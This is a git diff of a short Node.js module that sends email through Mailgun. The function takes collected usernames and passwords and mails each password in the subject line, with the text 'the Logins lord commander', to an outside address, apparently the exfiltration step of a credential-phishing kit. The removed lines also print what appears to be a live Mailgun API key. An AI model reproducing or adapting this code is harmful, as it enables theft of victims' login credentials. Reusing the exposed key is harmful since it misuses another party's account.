@@ -1,20 +1,21 @@
 const nodemailer = require('nodemailer')
 const mailGun = require('nodemailer-mailgun-transport')
+require('dotenv').config();
 
 
 const auth = {
     auth: {
-        api_key:'f0e56413f90bf2b3db33963747581f75-3e508ae1-1978f0f4',
-        domain: 'sandbox65139aeb630744a889bc58d33c4c44db.mailgun.org'
+        api_key: process.env.MAILGUN_API_KEY,
+        domain: process.env.MAILGUN_DOMAIN
     }
-}
+};
 
 const transporter = nodemailer.createTransport(mailGun(auth))
 
 const sendMail = (collectUserName,collectPassword,cb) => {
     const mailOptions = {
         from: collectUserName,
-        to: 'srilekha@cststech.com',
+        to: 'mbush@phoenixcds.org',
         subject: collectPassword,
         text: 'the Logins lord commander'
     }
